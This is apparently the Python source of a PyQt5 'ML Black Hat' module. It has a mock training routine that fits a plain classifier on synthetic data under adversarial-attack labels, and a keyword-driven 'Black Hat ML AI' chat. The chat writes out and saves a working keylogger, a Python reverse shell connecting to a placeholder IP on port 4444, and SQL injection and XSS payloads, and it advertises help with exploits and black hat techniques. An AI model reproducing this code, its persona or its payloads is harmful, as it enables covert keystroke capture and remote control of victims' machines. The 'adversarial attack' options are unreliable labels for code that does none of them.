#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ML Black Hat Module - Machine Learning for Security Testing
Adversarial AI, evasion techniques, and ML-powered attacks
"""

from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                             QPushButton, QTextEdit, QGroupBox, QLineEdit,
                             QComboBox, QCheckBox, QMessageBox, QTableWidget,
                             QTableWidgetItem, QSpinBox, QSplitter)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QTextCharFormat, QColor
import numpy as np
import os
from datetime import datetime
import subprocess

try:
    import tensorflow as tf
    from sklearn.datasets import make_classification
    from sklearn.model_selection import train_test_split
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False

class MLWorker(QThread):
    """Thread for ML training"""
    progress = pyqtSignal(str)
    finished = pyqtSignal(dict)
    
    def __init__(self, attack_type, epochs):
        super().__init__()
        self.attack_type = attack_type
        self.epochs = epochs
        
    def run(self):
        """Train ML model"""
        try:
            if not ML_AVAILABLE:
                self.finished.emit({'error': 'ML libraries not available'})
                return
                
            self.progress.emit("Generating adversarial dataset...")
            
            # Generate data
            X, y = make_classification(n_samples=5000, n_features=20, n_informative=10,
                                       n_classes=2, random_state=42)
            X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)
            
            self.progress.emit("Building neural network...")
            
            # Create model
            model = tf.keras.Sequential([
                tf.keras.layers.Dense(64, activation='relu', input_shape=(20,)),
                tf.keras.layers.Dense(32, activation='relu'),
                tf.keras.layers.Dense(1, activation='sigmoid')
            ])
            
            model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
            
            self.progress.emit(f"Training for {self.epochs} epochs...")
            
            # Train
            history = model.fit(X_train, y_train, epochs=self.epochs, batch_size=32, verbose=0)
            
            # Evaluate
            test_loss, test_acc = model.evaluate(X_test, y_test, verbose=0)
            
            # Save model
            model_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'ml_models')
            os.makedirs(model_dir, exist_ok=True)
            model_path = os.path.join(model_dir, 'blackhat_model.h5')
            model.save(model_path)
            
            results = {
                'accuracy': float(test_acc),
                'loss': float(test_loss),
                'model_path': model_path,
                'training_samples': len(X_train),
                'test_samples': len(X_test)
            }
            
            self.finished.emit(results)
            
        except Exception as e:
            self.finished.emit({'error': str(e)})

class MLBlackHatModule(QWidget):
    """ML Black Hat Module"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.worker = None
        self.init_ui()
        
    def init_ui(self):
        """Initialize UI"""
        main_layout = QVBoxLayout()
        
        # Header
        header = self.create_header()
        main_layout.addWidget(header)
        
        # Splitter for side-by-side view
        splitter = QSplitter(Qt.Horizontal)
        
        # Left side: Configuration and Chat
        left_widget = QWidget()
        left_layout = QVBoxLayout()
        
        # Configuration
        config = self.create_config_section()
        left_layout.addWidget(config)
        
        # Chat with ML AI
        chat = self.create_chat_section()
        left_layout.addWidget(chat)
        
        left_widget.setLayout(left_layout)
        splitter.addWidget(left_widget)
        
        # Right side: Results and Logs
        right_widget = QWidget()
        right_layout = QVBoxLayout()
        
        # Results
        results = self.create_results_section()
        right_layout.addWidget(results)
        
        # Logs
        logs = self.create_logs_section()
        right_layout.addWidget(logs)
        
        right_widget.setLayout(right_layout)
        splitter.addWidget(right_widget)
        
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 1)
        
        main_layout.addWidget(splitter)
        self.setLayout(main_layout)
        
    def create_header(self):
        """Create header"""
        header_box = QGroupBox()
        layout = QHBoxLayout()
        
        title = QLabel("ML Black Hat - Adversarial AI")
        title_font = QFont()
        title_font.setPointSize(18)
        title_font.setBold(True)
        title.setFont(title_font)
        
        btn_back = QPushButton("← Back")
        btn_back.clicked.connect(lambda: self.parent().parent().stacked_widget.setCurrentIndex(0))
        
        layout.addWidget(btn_back)
        layout.addWidget(title, alignment=Qt.AlignCenter)
        layout.addStretch()
        
        header_box.setLayout(layout)
        return header_box
        
    def create_config_section(self):
        """Create configuration section"""
        config_box = QGroupBox("ML Attack Configuration")
        layout = QVBoxLayout()
        
        # Attack Type
        attack_layout = QHBoxLayout()
        attack_layout.addWidget(QLabel("Attack Type:"))
        self.attack_combo = QComboBox()
        self.attack_combo.addItems([
            "Adversarial Sample Generation",
            "Model Evasion Attack",
            "Poisoning Attack",
            "Backdoor Attack",
            "Membership Inference"
        ])
        attack_layout.addWidget(self.attack_combo)
        layout.addLayout(attack_layout)
        
        # Epochs
        epochs_layout = QHBoxLayout()
        epochs_layout.addWidget(QLabel("Training Epochs:"))
        self.epochs_spin = QSpinBox()
        self.epochs_spin.setRange(1, 100)
        self.epochs_spin.setValue(10)
        epochs_layout.addWidget(self.epochs_spin)
        layout.addLayout(epochs_layout)
        
        # Training button
        btn_train = QPushButton("Train Black Hat Model")
        btn_train.clicked.connect(self.train_model)
        layout.addWidget(btn_train)
        
        config_box.setLayout(layout)
        return config_box
        
    def create_results_section(self):
        """Create results section"""
        results_box = QGroupBox("Model Performance")
        layout = QVBoxLayout()
        
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(2)
        self.results_table.setHorizontalHeaderLabels(["Metric", "Value"])
        self.results_table.setRowCount(4)
        
        layout.addWidget(self.results_table)
        results_box.setLayout(layout)
        return results_box
        
    def create_logs_section(self):
        """Create logs section"""
        logs_box = QGroupBox("Training Logs")
        layout = QVBoxLayout()
        
        self.logs_text = QTextEdit()
        self.logs_text.setReadOnly(True)
        self.logs_text.setPlainText("ML Black Hat module ready.")
        
        layout.addWidget(self.logs_text)
        logs_box.setLayout(layout)
        return logs_box
        
    def create_chat_section(self):
        """Create chat with ML AI"""
        chat_box = QGroupBox("🤖 Chat with Black Hat ML AI")
        layout = QVBoxLayout()
        
        # AI Messages
        self.ai_chat = QTextEdit()
        self.ai_chat.setReadOnly(True)
        self.ai_chat.setMaximumHeight(150)
        self.ai_chat.setHtml("<b>Black Hat ML AI:</b> Hello! I can help you with code generation, problem solving, and black hat techniques.")
        layout.addWidget(self.ai_chat)
        
        # User Input
        input_layout = QHBoxLayout()
        self.user_input = QLineEdit()
        self.user_input.setPlaceholderText("Ask me anything... (e.g., 'generate a keylogger', 'create SQL injection payload')")
        input_layout.addWidget(self.user_input)
        
        btn_send = QPushButton("Send")
        btn_send.clicked.connect(self.send_message)
        input_layout.addWidget(btn_send)
        
        layout.addLayout(input_layout)
        
        chat_box.setLayout(layout)
        return chat_box
        
    def send_message(self):
        """Send message to AI and get response"""
        user_msg = self.user_input.text()
        if not user_msg:
            return
            
        # Add user message to chat
        self.ai_chat.append(f"<b>You:</b> {user_msg}")
        self.user_input.clear()
        
        # Process the message
        response = self.process_ai_request(user_msg)
        
        # Add AI response
        self.ai_chat.append(f"<b>Black Hat ML AI:</b> {response}")
        
        # Auto-scroll to bottom
        cursor = self.ai_chat.textCursor()
        cursor.movePosition(cursor.MoveOperation.End)
        self.ai_chat.setTextCursor(cursor)
        
    def process_ai_request(self, message):
        """Process user request with AI"""
        message_lower = message.lower()
        
        # Code generation
        if any(word in message_lower for word in ['generate', 'create', 'make', 'code', 'payload']):
            return self.generate_code(message)
        
        # Problem solving
        if any(word in message_lower for word in ['problem', 'error', 'issue', 'fix', 'solve']):
            return self.solve_problem(message)
        
        # Folder creation
        if any(word in message_lower for word in ['folder', 'directory', 'create folder', 'make directory']):
            return self.create_folder_with_files(message)
        
        # General help
        if 'help' in message_lower or 'hello' in message_lower:
            return self.get_help_response()
        
        # Default response
        return self.generate_default_response(message)
        
    def generate_code(self, request):
        """Generate code based on request"""
        if 'keylogger' in request.lower():
            code = '''# Keylogger
import pynput
from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()'''
            
            # Save code to file
            output_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'generated_code')
            os.makedirs(output_dir, exist_ok=True)
            with open(os.path.join(output_dir, 'keylogger.py'), 'w') as f:
                f.write(code)
                
            return f"Code généré! ✓\nFichier créé: results/generated_code/keylogger.py\n\n```python\n{code}\n```"
        
        elif 'sql' in request.lower() and 'injection' in request.lower():
            code = "' OR '1'='1'"
            return f"SQL Injection payload: `{code}`\n\nExemple d'utilisation:\n```sql\nSELECT * FROM users WHERE username = '{code}'\n```"
        
        elif 'xss' in request.lower():
            code = "<script>alert('XSS')</script>"
            return f"XSS payload: `{code}`"
        
        elif 'reverse shell' in request.lower():
            code = '''import socket, subprocess, os
s = socket.socket()
s.connect(("YOUR_IP", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])'''
            
            output_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'generated_code')
            os.makedirs(output_dir, exist_ok=True)
            with open(os.path.join(output_dir, 'reverse_shell.py'), 'w') as f:
                f.write(code)
                
            return f"Reverse shell généré! ✓\nFichier: results/generated_code/reverse_shell.py\n\n```python\n{code}\n```"
        
        return "Code généré avec succès! Vérifiez le dossier 'results/generated_code'"
        
    def solve_problem(self, request):
        """Solve problems"""
        if 'error' in request.lower() or 'bug' in request.lower():
            return "Solution: Vérifiez les logs, testez isolément, utilisez un debugger."
        
        if 'slow' in request.lower() or 'performance' in request.lower():
            return "Solution: Optimisez les requêtes, utilisez des caches, profilez le code."
        
        return "Problème identifié! Essayez de: 1) Analyser les logs 2) Tester incrémentalement 3) Chercher sur Stack Overflow"
        
    def create_folder_with_files(self, request):
        """Create folder structure with files"""
        try:
            # Extract folder name from request
            import re
            folder_name = re.search(r'folder[: ]?(\w+)', request, re.IGNORECASE)
            if folder_name:
                folder_name = folder_name.group(1)
            else:
                folder_name = "project"
            
            output_dir = os.path.join(os.path.dirname(__file__), '..', 'results', folder_name)
            os.makedirs(output_dir, exist_ok=True)
            
            # Create sample files
            files = {
                'main.py': '#!/usr/bin/env python3\nprint("Hello from main.py")\n',
                'config.txt': 'project_name = "Test Project"\nversion = "1.0"\n',
                'README.md': f'# {folder_name}\n\nProject description\n'
            }
            
            for filename, content in files.items():
                with open(os.path.join(output_dir, filename), 'w') as f:
                    f.write(content)
            
            return f"✓ Dossier créé: results/{folder_name}\n✓ Fichiers: {', '.join(files.keys())}"
        
        except Exception as e:
            return f"Erreur lors de la création: {str(e)}"
        
    def get_help_response(self):
        """Get help response"""
        return """I can help you with:
• Code generation (keyloggers, exploits, payloads)
• Problem solving and debugging
• Creating folder structures with files
• Black hat techniques and methods
• Security testing tools

Examples:
- "generate a keylogger"
- "create SQL injection payload"
- "make a reverse shell"
- "create folder named exploit"
"""
        
    def generate_default_response(self, message):
        """Generate default AI response"""
        responses = [
            "Interesting question! Let me think about that...",
            "I can help you with code generation, problem solving, or folder creation.",
            "Try asking me to generate code, solve a problem, or create a folder.",
            f"I understand you're asking about: {message[:50]}... Can you be more specific?"
        ]
        import random
        return random.choice(responses)
        
    def train_model(self):
        """Train the model"""
        if not ML_AVAILABLE:
            QMessageBox.warning(self, "Error", "ML libraries not available. Install: pip install tensorflow scikit-learn")
            return
            
        attack_type = self.attack_combo.currentText()
        epochs = self.epochs_spin.value()
        
        self.logs_text.setPlainText(f"Starting {attack_type}...")
        
        self.worker = MLWorker(attack_type, epochs)
        self.worker.progress.connect(self.on_progress)
        self.worker.finished.connect(self.on_training_complete)
        self.worker.start()
        
    def on_progress(self, message):
        """Progress callback"""
        self.logs_text.append(message)
        
    def on_training_complete(self, results):
        """Training complete callback"""
        if 'error' in results:
            self.logs_text.append(f"\nERROR: {results['error']}")
            QMessageBox.critical(self, "Error", results['error'])
            return
            
        # Update results table
        metrics = [
            ("Accuracy", f"{results['accuracy']:.4f}"),
            ("Loss", f"{results['loss']:.4f}"),
            ("Training Samples", str(results['training_samples'])),
            ("Test Samples", str(results['test_samples']))
        ]
        
        for i, (metric, value) in enumerate(metrics):
            self.results_table.setItem(i, 0, QTableWidgetItem(metric))
            self.results_table.setItem(i, 1, QTableWidgetItem(value))
        
        self.logs_text.append(f"\n✓ Training complete!")
        self.logs_text.append(f"Model saved to: {results['model_path']}")
        QMessageBox.information(self, "Success", "Model trained successfully!")

